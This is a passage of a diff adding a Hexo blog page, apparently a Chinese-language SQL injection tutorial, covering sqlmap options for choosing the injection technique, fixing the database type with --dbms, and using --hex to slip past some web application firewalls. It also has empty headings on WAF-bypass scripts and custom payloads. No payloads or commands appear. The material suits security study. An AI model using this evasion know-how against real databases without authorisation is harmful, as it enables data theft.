+<p>Sqlmap 很可能在接下来的 数据库注入后利用中使用耗时更为巨大的 time 注入技巧</p>
+<p>这对于攻击者其实是不利的</p>
+<p>那么通过这个参数去指定对应的注入技巧 可以大大减少数据库注入获取结果的时间 优化你的进攻效率</p>
+<h4 id="–dbms-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-dbms"><a href="#–dbms-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-dbms" class="headerlink" title="–dbms[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#dbms)"></a>–dbms[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#dbms)</h4><p>指定对应的数据库类型</p>
+<p>Mysql mssql 之类的 sqlmap 就不会去搜索爆破其他类型的数据库</p>
+<h4 id="–hex-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-hex"><a href="#–hex-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-hex" class="headerlink" title="–hex[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#hex)"></a>–hex[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#hex)</h4><p>以十六进制来进行注入的技巧</p>
+<p>在数据注入的时候使用这个可以规避掉一些 WAF</p>
+<h2 id="WAF-绕过-将特殊的-payload-编码的脚本-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-waf-绕过-将特殊的-payload-编码的脚本"><a href="#WAF-绕过-将特殊的-payload-编码的脚本-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-waf-绕过-将特殊的-payload-编码的脚本" class="headerlink" title="WAF 绕过 - 将特殊的 payload 编码的脚本[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#waf-绕过-将特殊的-payload-编码的脚本)"></a>WAF 绕过 - 将特殊的 payload 编码的脚本[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#waf-绕过-将特殊的-payload-编码的脚本)</h2><h2 id="自定义-Payload-自定义你的核心攻击语句"><a href="#自定义-Payload-自定义你的核心攻击语句" class="headerlink" title="自定义 Payload - 自定义你的核心攻击语句"></a>自定义 Payload - 自定义你的核心攻击语句</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/10/19/SQL%20%E6%B3%A8%E5%85%A5/" data-id="clnx5qaj50007ygsth16bbacl" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/10/19/sqlmap/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/10/19/%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AAdocker/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/%E5%90%AF%E5%8A%A8jar%E6%96%87%E4%BB%B6/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/Web%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%AC%AC%E4%B8%80%E8%AF%BE2.0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/Web%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%AC%AC%E4%B8%80%E8%AF%BE/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
